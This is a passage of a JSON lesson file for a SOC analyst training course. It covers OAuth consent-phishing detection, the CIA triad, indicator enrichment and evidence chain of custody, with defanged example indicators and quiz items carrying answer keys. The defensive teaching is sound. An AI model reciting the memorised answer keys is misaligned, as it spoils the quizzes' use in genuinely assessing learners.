mindset. It forces the SOC to think in terms of **delegated access and app governance**, not just logins, which is exactly why the detection and defence approach differs from everything else in the identity playbook."
    },
    {
      "heading": "Detection and Defence",
      "content": "Because consent phishing hides in legitimate flows, detection centres on the **consent and app-permission events** rather than on sign-in anomalies. In **Microsoft Entra**, the primary source is the **audit log**.\n\nHunt for these signals:\n\n- The **\"Consent to application\"** audit event, which records when a user granted permissions to an app, including which app and which scopes. A spike of these across many users, or grants to an app no one recognises, is the headline indicator.\n- **\"Add app role assignment\"** and **OAuth2PermissionGrant** entries showing new delegated permissions, especially sensitive scopes like `Mail.Read`, `Mail.ReadWrite`, `offline_access`, and `Files.Read.All`.\n- **Newly registered or newly consented applications** with low prevalence in your tenant, generic or brand-imitating names, publishers that are unverified, or reply URLs pointing to unfamiliar domains.\n- **Multiple users consenting to the same unfamiliar app** in a short window, which signals a campaign rather than a one-off.\n- Correlation with a **phishing email** wave and with the app then accessing Graph mail data.\n\nMicrosoft Defender for Cloud Apps and the built-in **OAuth app governance** and **risky OAuth app** detections can surface suspicious apps automatically; treat their findings as leads and confirm in the audit log which users and scopes are involved.\n\n**Defence** works on prevention plus governance.\n\n- **Restrict user consent.** Configure the tenant so users cannot freely consent to third-party apps, or can consent only to **verified publishers** for **low-risk permissions**. This is the single most effective control, because it removes the click that makes the attack work.\n- **Enable an admin consent workflow.** When an app needs permissions beyond the allowed baseline, route the request to administrators for review, so a human evaluates the app and scopes before any grant.\n- **Periodically review app grants.** Audit existing enterprise applications and their consented permissions, and remove apps that are unused, over-permissioned, or unrecognised.\n- **Educate users** that a consent screen is a security decision, and that a trustworthy domain does not mean a trustworthy app.\n\n**Response** to a confirmed incident is specific: **revoke the malicious app's consent and delete the service principal**, **revoke the affected users' refresh tokens** to kill active sessions, review mailboxes for forwarding rules or other persistence, and hunt for what the token accessed. Note that a password reset alone is insufficient here; revoking the grant and the tokens is what actually removes the attacker. Feeding the offending app and its indicators back into blocklists closes the loop for the next campaign."
    }
  ],
  "keyTakeaways": [
    "OAuth consent phishing (MITRE T1528) tricks a user into approving a malicious app's permissions such as offline_access and Mail.Read; because no password is involved, the resulting token-based access survives password resets and MFA and blends into legitimate API traffic.",
    "Detection focuses on Entra audit events like 'Consent to application' and new OAuth permission grants to unfamiliar apps, while defence is restricting user consent, enabling an admin consent workflow, and reviewing grants; response requires revoking the app consent and refresh tokens, not just resetting the password."
  ],
  "quiz": [
    {
      "question": "A user reports clicking Accept on a Microsoft permission screen for an app called 'Mail Sync Helper' after receiving an email link. You confirm the app was granted offline_access and Mail.Read. The user then changed their password. Why is the password change alone insufficient to stop the attacker?",
      "options": [
        {
          "label": "The password change failed to propagate because the account still had an active MFA session token.",
          "value": "a"
        },
        {
          "label": "The attacker holds a refresh token from the consented app, so mailbox access continues despite the reset.",
          "value": "b"
        },
        {
          "label": "Password changes never affect email access because mailboxes use a separate credential system entirely.",
          "value": "c"
        },
        {
          "label": "The app will simply request the password again automatically the next time it needs to read mail.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "In consent phishing the attacker never had the password; they hold a refresh token granted to the consented app, so resetting the password does not revoke that delegated access, and mailbox reads continue. Proper response is to revoke the app consent and the refresh tokens. Option a invents a propagation failure that is not the mechanism. Option c is false; mailboxes do use the account credential, but that is beside the point since no password is involved in the grant. Option d misunderstands OAuth, where the app uses tokens, not the password."
    },
    {
      "question": "Which preventive control most directly stops OAuth consent phishing from succeeding in an Entra ID tenant?",
      "options": [
        {
          "label": "Requiring users to change their passwords more frequently and enforcing longer minimum password length.",
          "value": "a"
        },
        {
          "label": "Blocking all inbound email attachments so phishing lures can never reach end users at all.",
          "value": "b"
        },
        {
          "label": "Restricting user consent so users cannot freely grant third-party apps, routing requests to admin review.",
          "value": "c"
        },
        {
          "label": "Enabling impossible-travel detection so distant sign-ins from the malicious app are always flagged.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "Restricting user consent removes the click that makes the attack work: if users cannot freely grant third-party apps and instead requests go through an admin consent workflow, a human reviews the app and scopes before any grant is issued. Option a addresses credentials, which are irrelevant since no password is stolen. Option b is impractical and misses the point, since the lure links to a real consent URL, not an attachment. Option d does not help because consent phishing produces no anomalous sign-in for the user; the app's token use blends into normal API traffic."
    }
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1528/",
    "https://learn.microsoft.com/en-us/defender-cloud-apps/investigate-risky-oauth",
    "https://learn.microsoft.com/en-us/entra/identity/enterprise-apps/manage-consent-requests"
  ],
  "xp": 210,
  "estimatedMinutes": 38,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-cia-triad-core-security-principles",
  "slug": "cia-triad-core-security-principles",
  "title": "The CIA Triad and Core Security Principles",
  "topic": "Security Fundamentals",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "Every alert a SOC analyst investigates ultimately comes down to a threat against one of three things: keeping data secret, keeping it trustworthy, or keeping it reachable. This lesson introduces the CIA Triad (Confidentiality, Integrity, Availability) and the working principles every analyst operates under: defense-in-depth, least privilege, zero trust, and AAA. By the end you will be able to look at any incident and name exactly which security property it violates.",
  "sections": [
    {
      "heading": "Confidentiality: Keeping Secrets Secret",
      "content": "**Confidentiality** means that data is only readable by the people and systems authorized to see it. When confidentiality holds, a customer database, a set of credentials, or an internal document stays within the intended audience. When it breaks, unauthorized parties gain access to information they should never have touched.\n\nThink of a locked filing cabinet in a doctor's office. Only staff with a key can open it. The **encryption** that protects a laptop's disk, the **access controls** on a shared folder, and the **TLS** that scrambles traffic in transit are all confidentiality mechanisms — they are digital versions of that lock.\n\nAttacks that map to confidentiality are about **theft and exposure**:\n\n- **Data exfiltration** — an attacker copies a customer database out to an external server.\n- **Credential theft** — phishing that harvests a password grants an outsider a valid identity.\n- **Eavesdropping / sniffing** — capturing unencrypted traffic on the network.\n- **Misconfigured storage** — a public cloud bucket that leaks files to anyone with the URL.\n\nWhat a **SOC analyst** watches for: large outbound data transfers to unusual destinations, access to sensitive files by accounts that never touch them, sign-ins from impossible locations, and DLP (Data Loss Prevention) alerts flagging PII or source code leaving the environment. When you triage such an alert, the core question is: *did unauthorized eyes reach data they should not have?* If yes, this is a **confidentiality** incident, and your report should identify what data was exposed, to whom, and over what channel. That scope directly drives breach-notification obligations, so precise documentation here matters beyond the technical fix."
    },
    {
      "heading": "Integrity and Availability: Trust and Uptime",
      "content": "**Integrity** means data and systems are accurate and have not been altered by an unauthorized party. You need to trust that a bank balance, a configuration file, or a log entry says what it is supposed to say. Integrity mechanisms include **hashing** (a checksum that changes if even one byte changes), **digital signatures**, and **file-integrity monitoring**.\n\nIntegrity attacks are about **tampering**: an attacker modifies a payroll record, defaces a website, plants a backdoor in code, or — critically for the SOC — **deletes or edits logs** to hide their tracks. **Ransomware** also violates integrity when it encrypts files in place. As an analyst, unexpected changes to system files, new scheduled tasks, or gaps in log continuity are your integrity red flags.\n\n**Availability** means authorized users can reach the data and services when they need them. A system nobody can log into is failing at availability even if its data is perfectly secret and intact.\n\nAvailability attacks are about **denial**:\n\n- **DDoS** — flooding a service so real users cannot connect.\n- **Ransomware** — locking files so the business cannot operate (it hits both integrity and availability).\n- **Destructive wiping** — deleting data or backups.\n\n| Property | Question it answers | Example violation |\n|---|---|---|\n| Confidentiality | Who can read it? | Data leak |\n| Integrity | Can I trust it is unchanged? | Tampered logs |\n| Availability | Can I reach it when needed? | DDoS outage |\n\nMany real incidents hit more than one property at once — ransomware is the classic example, denying availability while destroying integrity, and sometimes stealing data first (confidentiality) in a **double-extortion** play. Naming each affected property keeps your investigation and impact assessment complete."
    },
    {
      "heading": "Defense-in-Depth and Least Privilege",
      "content": "The CIA Triad describes *what* we protect. The core principles describe *how* we build defenses so that a SOC has something to monitor.\n\n**Defense-in-depth** is the principle of layered controls: never rely on a single wall. If a phishing email slips past the mail gateway, endpoint protection may still catch the payload; if that fails, network segmentation limits spread, and logging still records the activity for the SOC. Each layer is a chance to detect or stop the attacker. This is why analysts correlate signals across email, endpoint, and network — the layers are designed to back each other up, and an attack that trips several of them at once is a strong signal. Think of a castle: a moat, then walls, then guards, then a locked keep. One failure does not lose the kingdom.\n\n**Least privilege** means every user, service, and process gets only the access it needs to do its job — and nothing more. A help-desk account should not be a domain administrator. When least privilege is enforced, a compromised account can do limited damage, which shrinks the **blast radius** of any breach.\n\nFor the SOC, least privilege turns certain events into loud alarms:\n\n- A standard user account suddenly performing administrative actions.\n- A service account interactively logging in when it should only run in the background.\n- **Privilege escalation** — an account acquiring rights it never had before.\n\nThese are exactly the deviations analysts hunt for, because they signal an attacker trying to expand access. Related principles you will hear alongside least privilege are **need-to-know** (access to specific data, not just systems) and **separation of duties** (no single person can complete a sensitive action alone, reducing insider risk). Together, least privilege and defense-in-depth ensure that even a successful initial intrusion faces friction, leaves traces, and stays contained — giving the analyst both time and evidence to respond."
    },
    {
      "heading": "Zero Trust and AAA",
      "content": "**Zero trust** is a modern extension of least privilege captured by the phrase *\"never trust, always verify.\"* Traditional security assumed anything inside the corporate network was safe. Zero trust drops that assumption: every request is authenticated and authorized regardless of where it comes from, because attackers who breach the perimeter would otherwise roam freely. In practice this means continuous verification, strong **MFA (Multi-Factor Authentication)**, device-health checks, and micro-segmentation. For a SOC, a zero-trust environment produces richer telemetry — each access decision is logged — giving analysts more visibility into lateral movement.\n\n**AAA** is the framework that makes identity-based security work. It stands for three linked functions:\n\n- **Authentication** — proving *who you are* (password, MFA token, certificate). It answers: is this really the user they claim to be?\n- **Authorization** — deciding *what you are allowed to do* once authenticated (which files, which commands). It answers: does this verified identity have permission for this action?\n- **Accounting** (also called auditing) — *recording what you did* (the logs of logins, access, and changes). It answers: what happened, by whom, and when?\n\nAccounting is the SOC analyst's lifeblood. Without the accounting logs — sign-in events, file-access records, command history — there is nothing to detect or investigate. Every investigation reconstructs a timeline from these records.\n\nMap the pieces to an incident and it clicks together: a **failed-login spike** is an authentication problem (someone guessing credentials); an account **reaching data it should not** is an authorization problem (least privilege or permissions failed); and the ability to **prove any of it happened** depends entirely on accounting. When you write an incident report, you are effectively narrating the accounting record to show where authentication or authorization broke, and which CIA property the attacker ultimately violated. These principles are not academic — they are the vocabulary you will use in every ticket you close."
    }
  ],
  "keyTakeaways": [
    "Every incident violates at least one leg of the CIA Triad: Confidentiality (data exposed), Integrity (data altered), or Availability (access denied) — and ransomware often hits all three, so name each affected property when you scope an incident.",
    "Defense-in-depth, least privilege, and zero trust exist to contain and expose attackers, while AAA (Authentication, Authorization, Accounting) provides the identity controls and — through accounting logs — the evidence a SOC analyst needs to detect and reconstruct any attack."
  ],
  "quiz": [
    {
      "question": "An analyst finds that an attacker gained access to a file server and quietly edited several months of application logs to remove traces of their activity, while leaving the data readable and the server online. Which element of the CIA Triad is most directly violated?",
      "options": [
        {
          "label": "Availability, because editing the logs prevented users from reaching the file server and its services.",
          "value": "a"
        },
        {
          "label": "Integrity, because the logs were altered by an unauthorized party and can no longer be trusted as accurate.",
          "value": "b"
        },
        {
          "label": "Confidentiality, because the attacker was able to read the sensitive contents of the log files.",
          "value": "c"
        },
        {
          "label": "Authentication, because the attacker must have stolen a valid password to reach the file server.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct is (b): altering data so it no longer reflects reality is the textbook definition of an integrity violation, and tampered logs specifically undermine the trustworthiness of evidence. (a) is wrong because the server stayed online and reachable, so availability was not denied. (c) is wrong because merely reading logs would be confidentiality, but the harm described is modification, not exposure. (d) names an access mechanism, not a CIA property — authentication is how they got in, not what was ultimately violated."
    },
    {
      "question": "A standard help-desk user account, which normally only resets passwords, is suddenly seen creating new domain administrator accounts at 3 a.m. Which core security principle is designed to make this activity both limited in damage and easy to flag as suspicious?",
      "options": [
        {
          "label": "Availability monitoring, which ensures that critical services stay online and reachable for all users.",
          "value": "a"
        },
        {
          "label": "Defense-in-depth, which layers multiple independent controls so no single failure loses everything.",
          "value": "b"
        },
        {
          "label": "Least privilege, which grants each account only the access it needs, making extra rights a red flag.",
          "value": "c"
        },
        {
          "label": "Accounting, which records every login and change so investigators can build a timeline later.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "Correct is (c): least privilege means a help-desk account should never be able to create admins, so both the limited blast radius and the anomaly detection stem from that principle. (b) defense-in-depth is real and valuable but describes layering controls generally, not why this specific privilege deviation stands out. (d) accounting is what let you *see* the event, but it does not constrain what the account can do. (a) is unrelated — nothing here concerns service uptime."
    }
  ],
  "references": [
    "https://csrc.nist.gov/glossary/term/cia_triad",
    "https://csrc.nist.gov/pubs/sp/800/207/final",
    "https://attack.mitre.org/tactics/TA0004/"
  ],
  "xp": 180,
  "estimatedMinutes": 34,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-enrichment-tools-virustotal-whois-passive-dns",
  "slug": "enrichment-tools-virustotal-whois-passive-dns",
  "title": "Enrichment Tools: VirusTotal, WHOIS, and Passive DNS",
  "topic": "Threat Intelligence",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "When an alert drops an indicator on your desk — a file hash, a URL, a domain, an IP — your first job is enrichment: turning that bare artifact into context you can act on. This lesson covers the everyday enrichment toolkit a SOC analyst reaches for: VirusTotal, WHOIS, Passive DNS, and reputation feeds. You will learn how to read what they tell you, how to pivot from one indicator to related infrastructure, and the OPSEC caution that keeps you from tipping off the attacker.",
  "sections": [
    {
      "heading": "Reading VirusTotal Without Over-Trusting It",
      "content": "**VirusTotal (VT)** is a free service that runs a submitted file, hash, URL, IP, or domain against dozens of antivirus engines and tools, then aggregates the results. It is usually the first stop when you have an unknown indicator, because it answers *\"has anyone seen this before, and did anything flag it?\"* in seconds.\n\nThe headline you see is the **detection ratio** — for example, `12 / 70` means 12 of 70 engines flagged the sample as malicious. Beginners treat this like a score, but experienced analysts read it carefully:\n\n- **A low count is not a clean bill of health.** Fresh malware and targeted attacks are often detected by zero engines at first. `0/70` means *unknown*, not *safe*.\n- **A high count is not automatic proof of doom.** Engines copy each other and produce generic labels; a few detections on a common tool can be false positives.\n- **Read the labels, not just the number.** Names like `Trojan.GenericKD` are vague; a specific family name (e.g., `Emotet`, `Cobalt Strike`) is far more actionable.\n\nBeyond the detection tab, the real value is in context. The **Details** tab shows first-submission date and file properties. The **Relations** tab links the indicator to contacted domains, IPs, dropped files, and parent files — this is your pivot map. The **Community** tab and comments may hold analyst notes or threat-intel references.\n\n**Crucial caution:** when you *search* an existing hash, you only query VT's database. When you **upload a file**, that file becomes visible to VT's subscribers — which may include the attacker, or may leak sensitive corporate data. Never upload confidential documents or anything you would not want an adversary to see. Search by hash first; upload only when you understand the exposure."
    },
    {
      "heading": "WHOIS and Domain Age as a Signal",
      "content": "**WHOIS** is the public registration record for a domain. Querying it tells you when the domain was registered, who the registrar is, when it was last updated, when it expires, and sometimes registrant contact details (though these are frequently hidden behind **privacy protection** services today).\n\nThe single most useful field for a SOC analyst is the **creation date**, because it reveals **domain age**. Attackers register throwaway domains for phishing and command-and-control, use them for a short campaign, and abandon them. Legitimate businesses tend to have domains that are years old. So a domain that was **registered yesterday or a few days ago** — a **Newly Registered Domain (NRD)** — is a meaningful risk signal, especially when it appears in a phishing link or an unexpected outbound connection.\n\nConcrete ways WHOIS shows up in daily work:\n\n- A user reports a suspicious email; the link points to `secure-login-update[.]com`. WHOIS shows it was created three days ago — strong support that it is malicious.\n- A domain impersonating your bank was registered through a registrar known for lax abuse handling, adding to suspicion.\n- The registrant email or organization matches other known-bad domains, giving you a pivot.\n\nUse WHOIS as **corroborating evidence**, not a sole verdict. Old domains can be compromised or bought, and some legitimate services spin up new domains. But combined with a poor reputation and suspicious content, a fresh registration date turns a maybe into a confident escalation.\n\nMany SIEM and threat-intel platforms let you **automatically flag NRDs** (commonly domains younger than 30 days) so analysts do not have to check each one by hand. When you write your ticket, recording the creation date and registrar gives the next analyst — and any escalation — instant context about *why* the domain looked suspicious."
    },
    {
      "heading": "Passive DNS and Pivoting Infrastructure",
      "content": "**Passive DNS (pDNS)** is a historical record of how domains and IP addresses have mapped to each other over time. Sensors around the internet observe DNS resolutions and store them, so instead of asking *\"what does this domain resolve to right now?\"* you can ask *\"what has it resolved to over the past months, and what else has lived on that IP?\"*\n\nThis historical view is what makes **pivoting** possible — expanding from one known indicator to the attacker's wider infrastructure:\n\n- **Domain to IP:** A malicious domain currently resolves to `203.0.113.45`. Passive DNS shows it also used two other IPs last month — new leads to investigate and block.\n- **IP to Domains:** That IP has hosted 40 other domains, several with the same NRD pattern and naming scheme. You may have uncovered a whole phishing kit's infrastructure.\n- **Shared hosting caution:** An IP hosting *thousands* of unrelated domains is likely a shared or CDN provider, so co-location there is weak evidence. Co-location on a small, dedicated server is much stronger.\n\nThe practical payoff: from a single alert you can build a list of related domains and IPs, then search your own logs to see whether *any* of them have been contacted by other hosts in your environment — turning one detection into full-scope discovery of who else is affected.\n\n**Reputation feeds** complete the toolkit. These are curated lists — commercial or open-source — that score IPs, domains, and URLs as malicious, suspicious, or clean based on observed behavior (spam, malware hosting, botnet C2). Tools like AbuseIPDB, URLhaus, and vendor threat-intel feeds let you quickly ask *\"is this indicator already known bad?\"* A hit adds weight to your case; no hit again means *unknown*, not *safe*. Cross-referencing several independent sources, rather than trusting any one feed, is how you avoid both false positives and false confidence."
    },
    {
      "heading": "Putting It Together: Enrichment Workflow and OPSEC",
      "content": "Enrichment is a repeatable loop. Suppose an EDR alert fires on a workstation that connected to an unfamiliar domain and downloaded a file. A typical flow:\n\n1. **Hash the file** and search **VirusTotal** by hash. Read the detection labels and the Relations tab, noting any contacted domains or IPs.\n2. **WHOIS the domain.** Check the creation date — is it a newly registered domain? Note the registrar.\n3. **Passive DNS** the domain and its IPs. Pull historical mappings and co-located domains to map the infrastructure.\n4. **Check reputation feeds** for every indicator you have gathered — the original domain plus everything the pivots surfaced.\n5. **Search your own logs** for all of those indicators to find any other affected hosts.\n6. **Document** each indicator, what each tool said, and your verdict, so the next analyst can follow your reasoning.\n\nThroughout, hold to one governing rule: **do not tip off the attacker.** This is the **OPSEC** (Operational Security) discipline of enrichment.\n\n- **Passive first.** Prefer lookups that query stored data (search a hash on VT, read passive DNS, check feeds) over actions that touch the attacker's infrastructure.\n- **Beware unique URLs.** Phishing and C2 links often embed a **victim-specific token** (e.g., `.../track?id=USER123`). If you paste that exact URL into VirusTotal or click it, the attacker sees it was accessed — and now knows their campaign was detected. They may burn the infrastructure, rotate domains, or accelerate the attack.\n- **Use sandboxes and proxies deliberately.** When you must detonate something, do it in an isolated environment through anonymized egress, never from your corporate IP, and strip or defang unique identifiers first.\n- **Defang indicators** in tickets and chat (`hxxp://evil[.]com`) so nobody clicks them by accident.\n\nEnrichment tools turn a bare indicator into a decision — but used carelessly they can betray your investigation. Reading each source critically (unknown is not safe) and moving quietly is what separates a junior lookup from real analyst tradecraft."
    }
  ],
  "keyTakeaways": [
    "Enrich every indicator across multiple sources — VirusTotal for reputation and relations, WHOIS for domain age (newly registered domains are a strong signal), passive DNS for pivoting to related infrastructure, and reputation feeds for known-bad hits — and remember that a low or zero score means 'unknown,' never 'safe.'",
    "OPSEC is part of enrichment: work from stored/passive data first, defang indicators, and never detonate or submit an attacker's victim-specific unique URL, because doing so tips them off that their campaign was detected."
  ],
  "quiz": [
    {
      "question": "You receive a phishing email whose link is hxxps://portal-reset[.]com/verify?token=Zx91kQ, unique to the targeted user. You want to know if the domain is malicious. Which action best balances getting useful intel with sound OPSEC?",
      "options": [
        {
          "label": "Paste the full URL including the token into VirusTotal so every engine can scan the exact malicious page the user received.",
          "value": "a"
        },
        {
          "label": "Search the bare domain and its hash in VirusTotal and passive DNS, and check WHOIS for the creation date, without visiting the tokenized URL.",
          "value": "b"
        },
        {
          "label": "Open the link in your normal browser from your workstation to observe exactly what the phishing page asks the victim to do.",
          "value": "c"
        },
        {
          "label": "Forward the email to your personal account so you can safely click the unique link from a network outside the company.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct is (b): querying stored data about the domain and checking registration age gets you intel without touching the attacker's tokenized endpoint, preserving OPSEC. (a) submits the victim-specific token to a service the attacker may monitor, and VT will fetch the URL — tipping them off. (c) detonates hostile content on a corporate endpoint from the corporate IP, both risky and revealing. (d) still accesses the unique URL, alerting the attacker, and moves the threat to an unmanaged environment."
    },
    {
      "question": "A file hash you look up on VirusTotal shows a detection ratio of 0/72, and a domain in the same alert was registered four days ago per WHOIS. How should you interpret these two facts together?",
      "options": [
        {
          "label": "The 0/72 confirms the file is clean, so the recently registered domain is almost certainly a harmless new business site.",
          "value": "a"
        },
        {
          "label": "The zero detections mean the file is merely unknown, and the very recent domain registration is a genuine risk signal worth escalating.",
          "value": "b"
        },
        {
          "label": "Both signals are meaningless because VirusTotal and WHOIS are unreliable and should never influence an analyst's verdict.",
          "value": "c"
        },
        {
          "label": "The domain age is irrelevant since only antivirus detection ratios can determine whether an indicator is truly malicious.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct is (b): a 0/72 ratio means no engine has flagged it yet, which is common for fresh or targeted malware — unknown, not safe — while a four-day-old domain is a classic newly-registered-domain risk indicator, so together they warrant a closer look. (a) misreads 'unknown' as 'clean' and ignores the suspicious domain age. (c) wrongly dismisses two standard, useful enrichment sources. (d) is false — domain age is a well-established signal, and detection ratios are only one input among many."
    }
  ],
  "references": [
    "https://docs.virustotal.com/docs/how-it-works",
    "https://www.cisa.gov/news-events/news/understanding-domain-name-system-dns",
    "https://attack.mitre.org/techniques/T1596/"
  ],
  "xp": 180,
  "estimatedMinutes": 34,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-evidence-collection-chain-of-custody",
  "slug": "evidence-collection-chain-of-custody",
  "title": "Evidence Collection and Chain of Custody",
  "topic": "Incident Response",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "When an incident might lead to legal action, insurance claims, or internal discipline, how you handle evidence matters as much as how you stop the attack. Mishandled evidence is worthless in court and can undermine your entire investigation. This lesson teaches the practical evidence-handling knowledge a SOC analyst needs: the order of volatility, why pulling power is usually the wrong move, imaging and hashing for integrity, and the chain of custody that keeps evidence admissible.",
  "sections": [
    {
      "heading": "Order of Volatility: Collect the Fragile First",
      "content": "Digital evidence exists on a spectrum of fragility. Some data vanishes the instant a machine loses power or reboots; other data survives for years. The **order of volatility** is the principle that you collect evidence from the most fleeting sources first, working toward the most durable — because every second you delay, volatile data may be overwritten or lost.\n\nA general order, from most to least volatile:\n\n| Priority | Source | Why it is fragile |\n|---|---|---|\n| 1 | CPU registers, cache | Overwritten in microseconds |\n| 2 | **RAM / memory**, running processes, network connections | Lost on power-off or reboot |\n| 3 | Temporary files, swap/page file | Rotated and overwritten during use |\n| 4 | **Disk** (hard drive / SSD) | Persists across reboots |\n| 5 | Logs on remote servers | Retained per policy, relatively stable |\n| 6 | **Backups**, archives | Designed for long-term retention |\n\nThe headline for a SOC analyst: **memory before disk before backups.** Volatile memory (RAM) is a goldmine — it can hold decryption keys, malware that never wrote itself to disk (**fileless malware**), active network connections, injected code, and clear-text credentials. None of that survives a shutdown.\n\nThis is why the **first instinct to \"just turn it off\"** is often a mistake. Powering down a compromised host to \"stop the bleeding\" destroys everything in RAM — potentially the only evidence of how the attack worked. Where feasible and safe, capture a **memory image** of the live system *before* touching power. The order of volatility is not academic trivia; it dictates the sequence of your very first response actions, and getting the sequence wrong means permanently losing evidence you can never recover."
    },
    {
      "heading": "Imaging and Hashing: Preserving Integrity",
      "content": "Once you decide to collect, the governing rule is: **never investigate on the original.** You work on a copy, so the original evidence stays pristine. Two techniques make this trustworthy.\n\n**Imaging** is creating a **bit-for-bit forensic copy** of a storage source — RAM or a disk. Unlike a normal file copy, a forensic image captures *everything*: allocated files, deleted-but-not-overwritten data, slack space, and file-system metadata. Disk imaging should be done through a **write blocker**, a hardware or software control that permits reading from the source drive while preventing any write back to it — so the mere act of copying cannot alter the original. Memory imaging uses a live acquisition tool because RAM cannot be write-blocked the same way.\n\n**Hashing** is how you *prove* the copy is faithful and stays unchanged. A cryptographic hash function (such as SHA-256) reduces any amount of data to a fixed fingerprint; change a single bit and the fingerprint changes completely. The workflow:\n\n1. Acquire the image.\n2. Compute the hash of the original source and of the image; they must match — proving the copy is exact.\n3. Record that hash value in your documentation.\n4. Any time later, re-hash the evidence; if it still matches, you have **proof it was not altered** since collection.\n\nThis is the digital equivalent of tamper-evident tape. In court, an opposing expert will ask, \"How do you know this file is what you found and not something you edited?\" Your answer is the matching hash. (MD5 and SHA-1 are still seen in older tooling, but SHA-256 is preferred because MD5/SHA-1 are cryptographically weakened.)\n\nFor a SOC analyst, even when full forensic imaging is handled by a specialist team, you are frequently the one who **hashes a captured file, a memory dump, or a suspicious sample** and logs that value — establishing the integrity baseline everything downstream depends on."
    },
    {
      "heading": "Chain of Custody: Who, What, When, How",
      "content": "Collecting evidence correctly is only half the job. You must also prove, from the moment of collection onward, that the evidence was continuously accounted for and never tampered with. That documented trail is the **chain of custody**.\n\nA chain-of-custody record answers, for every piece of evidence, four questions at each step:\n\n- **Who** handled it (the person's name and role).\n- **What** the evidence is (a precise description — device, serial number, hash value).\n- **When** each transfer or action happened (date and time).\n- **How** it was handled, stored, and transported (e.g., sealed in an anti-static bag, stored in a locked evidence locker).\n\nEvery time evidence changes hands or location, both parties sign the log. The result is an **unbroken timeline** from collection to presentation.\n\nWhy this matters so much: for evidence to be **admissible** in a legal proceeding, the party presenting it must show it is authentic and unaltered. A **broken chain of custody** — an unexplained gap in the timeline, evidence left unattended, a missing signature, no hash to prove integrity — lets the opposing side argue the evidence could have been tampered with or swapped. Even technically sound evidence can be thrown out on those grounds, potentially collapsing a case.\n\nPractical habits for a SOC analyst:\n\n- Document **as you go**, not from memory afterward. Contemporaneous notes with timestamps carry far more weight.\n- Record the **hash** in the custody log so integrity and custody are linked.\n- **Minimize handlers** — fewer people in the chain means fewer gaps to explain.\n- Store evidence securely with **restricted access**, and log every access.\n\nEven when a case never reaches court, this rigor makes your findings defensible internally — for HR actions, insurance, or regulators. Good custody discipline is simply good analysis discipline."
    },
    {
      "heading": "Containment vs. Preservation: The Practical Tension",
      "content": "During a live incident, two goals pull against each other. **Containment** wants to stop the attacker *now* — cut their access, halt data theft, prevent spread. **Preservation** wants to keep the scene intact so you can collect evidence and understand what happened. Move too aggressively and you destroy evidence; move too cautiously and the attacker keeps causing damage.\n\nThe most common flashpoint is the impulse to **pull the power (or the network cable) on a compromised host.** Consider the trade-offs:\n\n- **Pulling power** instantly stops on-host activity — but destroys everything in RAM (running malware, network sessions, keys, fileless artifacts) and can corrupt open files. You lose your most volatile, most valuable evidence.\n- **Hard shutdown via the OS** triggers logoff scripts and may let malware run cleanup or anti-forensic routines.\n\nThe generally preferred move for a SOC analyst is **network isolation, not power-off.** Isolating the host — via an EDR \"contain\" or \"quarantine\" action, disabling the switch port, or moving it to a quarantine VLAN — severs the attacker's command-and-control and stops lateral movement, while the machine **stays running** so memory and live state remain available for capture. You get containment *and* preservation.\n\nA sound sequence during a serious incident:\n\n1. **Isolate** the host from the network (contain) while leaving it powered on.\n2. **Capture volatile evidence** — memory image, running processes, network connections — following the order of volatility.\n3. **Image the disk** with a write blocker.\n4. **Hash** everything and record it.\n5. Maintain the **chain of custody** at every step.\n\nThere are exceptions. If a system is actively destroying data (e.g., ransomware mid-encryption) or a life-safety issue exists, immediate shutdown may be the lesser evil — a judgment call that usually belongs to an incident lead, not a first responder acting alone. As a SOC analyst, your job is to know these trade-offs, follow your organization's IR playbook, escalate the decision when stakes are high, and above all resist the reflex to power off before evidence is safe."
    }
  ],
  "keyTakeaways": [
    "Collect evidence in order of volatility — memory before disk before backups — because RAM holds fileless malware, keys, and live connections that vanish on power-off, and prove integrity by working on a hashed, write-blocked forensic image rather than the original.",
    "Prefer network isolation over pulling power so you contain the attacker while preserving volatile evidence, and maintain an unbroken chain of custody (who, what, when, how) with linked hash values, because a documented gap can render even sound evidence inadmissible."
  ],
  "quiz": [
    {
      "question": "A workstation is beaconing to a command-and-control server, and you suspect fileless malware running only in memory. Your instinct is to stop the threat fast. Which first action best balances containment with evidence preservation?",
      "options": [
        {
          "label": "Immediately pull the power cable to halt the malware and prevent it from causing any further damage on the host.",
          "value": "a"
        },
        {
          "label": "Isolate the host from the network via EDR containment while leaving it powered on, then capture a memory image.",
          "value": "b"
        },
        {
          "label": "Perform a normal operating-system shutdown so the machine closes its files cleanly before you begin collecting evidence.",
          "value": "c"
        },
        {
          "label": "Leave the host fully connected and running while you spend an hour writing up a detailed investigation plan first.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct is (b): network isolation severs the C2 channel and stops lateral movement (containment) while the machine stays on, preserving the RAM where fileless malware lives so you can image memory. (a) destroys all volatile evidence — exactly the artifacts you need for fileless malware. (c) keeps the attacker connected during shutdown and may trigger malware cleanup or anti-forensic routines. (d) leaves the attacker actively connected and exfiltrating while you delay containment."
    },
    {
      "question": "In court, opposing counsel claims the disk image you collected three months ago might have been altered since collection. Which practice most directly lets you rebut that claim?",
      "options": [
        {
          "label": "You can re-compute the SHA-256 hash of the image and show it matches the value you recorded and logged at collection time.",
          "value": "a"
        },
        {
          "label": "You explain that you are an experienced analyst and would never alter evidence during any investigation you handle.",
          "value": "b"
        },
        {
          "label": "You point out that the image was stored on an expensive enterprise server with strong general reliability guarantees.",
          "value": "c"
        },
        {
          "label": "You note that antivirus scanned the image and found no malware, proving the file has not changed since collection.",
          "value": "d"
        }
      ],
      "answer": "a",
